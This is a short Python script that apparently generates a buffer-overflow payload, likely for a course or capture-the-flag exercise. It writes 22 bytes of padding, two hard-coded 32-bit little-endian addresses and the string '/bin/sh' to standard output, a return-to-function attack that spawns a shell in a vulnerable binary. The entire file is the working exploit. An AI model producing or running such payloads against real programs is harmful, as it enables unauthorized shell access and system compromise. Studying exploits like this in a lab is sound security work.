from shellcode import shellcode
import sys
sys.stdout.buffer.write(b"a"*22+0x08048c12.to_bytes(4, "little")+0xFFF6FAB4.to_bytes(4, "little")+b"/bin/sh")